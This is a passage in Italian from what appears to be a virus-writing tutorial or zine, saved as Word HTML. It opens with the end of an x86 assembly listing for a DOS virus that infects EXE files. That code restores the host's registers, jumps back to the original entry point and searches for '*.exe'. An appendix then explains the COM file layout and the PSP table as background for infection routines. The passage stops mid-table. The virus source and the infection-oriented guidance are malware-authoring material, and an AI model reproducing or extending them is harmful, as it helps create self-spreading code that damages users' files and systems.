EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr cs:[bp+_ip],bx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>cli<span
style="mso-spacerun: yes">                           </span>;pulisce il flag di
interrupt <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
sp,word ptr cs:[bp+exe_sp]<span style="mso-spacerun: yes">     
</span>;aggiusta ExeSP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>add
ax,word ptr cs:[bp+exe_ss]<span style="mso-spacerun: yes">     
</span>;ripristina lo stack<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>mov
ss,ax<span style="mso-spacerun: yes">            </span><span
style="mso-spacerun: yes">         </span>;aggiusta ReloSS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">     
</span>sti<span style="mso-spacerun: yes">                          
</span>;setta il flag di interrupt<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
ax,ax<span style="mso-spacerun: yes">    </span>;pulisce I registri:
ax,bx,cx,dx,si,di<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
bx,bx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
cx,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
dx,dx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
di,di<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
si,si<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">      </span>xor
bp,bp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">    </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>db 0eah<span style="mso-spacerun: yes">                      
</span>;jmp far ptr seg:ofs (CS:IP)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>_ip<span
style="mso-spacerun: yes">          </span>dw 0<span style="mso-spacerun:
yes">                </span>;IP e CS registri usati come indirizzi per<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>_cs<span
style="mso-spacerun: yes">          </span>dw 0<span style="mso-spacerun:
yes">                </span>;db 0eah (JMP) istruzione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>;qui
riposano gi valori originali di CS:IP e SS:SP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>exe_cs<span style="mso-spacerun: yes">       </span>dw 0fff0h<span
style="mso-spacerun: yes">           </span>;CS:IP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>exe_ip<span style="mso-spacerun: yes">       </span>dw 0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>exe_sp<span style="mso-spacerun: yes">       </span>dw 0<span
style="mso-spacerun: yes">                </span>;SS:SP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>exe_ss<span style="mso-spacerun: yes">       </span>dw 0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">  
</span>filespec<span style="mso-spacerun: yes">     </span>db '*.exe',0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span>heap:<span
style="mso-spacerun: yes">                        </span>;questa è la fine del
codice virus<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'>file_attr<span style="mso-spacerun: yes">    </span>dw ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>file_time<span
style="mso-spacerun: yes">    </span>dw ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>file_date<span
style="mso-spacerun: yes">    </span>dw ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>header<span
style="mso-spacerun: yes">       </span>db 1ch dup (?)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>dta<span style="mso-spacerun:
yes">          </span>db 43 dup (?)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>code ends<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>end virus_start<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#C7DB65'>;********************************************************************************<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#33CCCC'>APPENDICE<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#33CCCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_STRUTTURE_DI_MEMORIA"></a><span style='font-size:14.0pt;
mso-bidi-font-size:24.0pt;mso-fareast-font-family:"MS Mincho";color:red'>STRUTTURE
DI MEMORIA DEI FILES COM<span style="mso-spacerun: yes">      </span><o:p></o:p></span></h1>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>A
grande richiesta, e ad ulteriore chiarimento del numero precedente…<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>1. Struttura dei file COM<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Una delle strutture più semplici per un programma
eseguibile è quella dei COM. Questo tipo di eseguibile ha solo un segmento di
64 kilobytes, e all’interno di questo segmento convivono codice, dati e stack.
In un COM gli indirizzi di base sono uguali: CS=DS=SS=ES. I programmi COM a
differenza degli EXE non hanno header, ed essi sul disco sono l’esatta copia di
ciò che sarà caricato in memoria. Quello che noi vediamo in un<span
style="mso-spacerun: yes">  </span>.COM sarà lo stesso di ciò che la memoria
contiene quando lo eseguiamo (questo è facilmente verificabile con il programma
DEBUG). <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Quando un COM viene esguito, il DOS costruisce il <b>PSP</b>,
(Program Segment Prefix) un’area di meoria che parte all’indirzzo 0 del
segmento libero. Tale area occupa<span style="mso-spacerun: yes">  </span>256
bytes (0x100H). Subito dopo il PSP viene caricata l’mmagine del COM image, che
è letto dal file su disco. Per questo motivo un COM parte da 100H (org 100h). Un
Com può occupare 64KB, incluso il suo PSP and lo spazio per lo stack. Anche se
il nostr COM è solo 200 bytes, il DOS assegnerà ad esso un intero segmento di
64KB. Se il nostro COM è<span style="mso-spacerun: yes">  </span>200 bytes, più
256 del PSP, noi abbiamo occupato solo 456 bytes in memoria. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Cosa succede del resto del segmento ? Questa parte è
chiamata <b>heap</b>. Spesso l’heap è utilizzato come un buffer per
memorizzarci dati e strutture come per esempio per la DTA nella routine
infettiva, o per la lettura della MBR nei virus multipartizione<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>immaginiamo di avere un file di 3KB nel disco. Esso
sarà così strutturato:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">        </span></span><span
lang=DE style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:DE'>0<span
style="mso-spacerun: yes">          </span>100h<span style="mso-spacerun:
yes">             </span>3 KB<span style="mso-spacerun:
yes">                                                  </span>64 K<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=DE
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:DE'><span
style="mso-spacerun: yes">       
</span>------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=DE
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:DE'><span
style="mso-spacerun: yes">        </span>|<span style="mso-spacerun: yes">  
</span>PSP<span style="mso-spacerun: yes">       </span>|<span
style="mso-spacerun: yes">  </span>codice<span style="mso-spacerun: yes">      
</span>|<span style="mso-spacerun: yes">      </span>HEAP<span
style="mso-spacerun: yes">                                            </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=DE
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:DE'><span
style="mso-spacerun: yes">        </span></span><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>|<span style="mso-spacerun: yes">                
</span>|<span style="mso-spacerun: yes">   </span>COM<span style="mso-spacerun:
yes">      </span>|<span style="mso-spacerun:
yes">                                                             </span>|<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">       
</span>------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>2. il PSP <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>PSP=Program Segment Prefix. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>E’ la struttura di controllo che il DOS costruisce
quando sta per essere eseguito un programma.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">   </span>campo<span
style="mso-spacerun: yes">       </span>Dec<span style="mso-spacerun: yes">    
</span>Hex<span style="mso-spacerun: yes">   </span>lunghezza<span
style="mso-spacerun: yes">  </span>descrizione<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">          </span>0<span style="mso-spacerun:
yes">         </span>0<span style="mso-spacerun: yes">         </span>2<span
style="mso-spacerun: yes">        </span>INT 20h<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">      </span><span style="mso-spacerun:
yes">    </span>2<span style="mso-spacerun: yes">         </span>2<span
style="mso-spacerun: yes">         </span>2<span style="mso-spacerun:
yes">        </span>Misura della memoria<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">          </span>4<span style="mso-spacerun:
yes">         </span>4<span style="mso-spacerun: yes">         </span>1<span
style="mso-spacerun: yes">        </span>Riservato<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">          </span>5<span style="mso-spacerun:
yes">         </span>5<span style="mso-spacerun: yes">         </span>5<span
style="mso-spacerun: yes">        </span>Call al dispatcher<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>10<span style="mso-spacerun:
yes">       </span>A<span style="mso-spacerun: yes">        </span>4<span
style="mso-spacerun: yes">         </span>Vettore INT 22h <o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>14<span style="mso-spacerun:
yes">       </span>E<span style="mso-spacerun: yes">        </span>4<span
style="mso-spacerun: yes">         </span>Vettore INT 23h <o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>7.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>18<span style="mso-spacerun:
yes">       </span>12<span style="mso-spacerun: yes">      </span>4<span
style="mso-spacerun: yes">         </span>Vettore INT 24h <o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>8.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>22<span style="mso-spacerun:
yes">       </span>16<span style="mso-spacerun: yes">      </span>22<span
style="mso-spacerun: yes">       </span>Area usata dal DOS<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>9.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>44<span style="mso-spacerun:
yes">       </span>2C<span style="mso-spacerun: yes">     </span>2<span
style="mso-spacerun: yes">         </span>Segmento delle variabili di ambiente<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>10.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>46<span style="mso-spacerun:
yes">       </span>2E<span style="mso-spacerun: yes">     </span>34<span
style="mso-spacerun: yes">        </span>Area di alvoro per il<span
style="mso-spacerun: yes">  </span>DOS <o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>11.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span><span style="mso-spacerun:
yes">        </span>80<span style="mso-spacerun: yes">       </span>50<span
style="mso-spacerun: yes">     </span>3<span style="mso-spacerun:
yes">          </span>Istruzioni INT 21h, RETF<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>12.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>83<span style="mso-spacerun:
yes">       </span>53<span style="mso-spacerun: yes">     </span>2<span
style="mso-spacerun: yes">          </span>Riservato<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>13.<span style='font:7.0pt "Times New Roman"'>&nbsp;
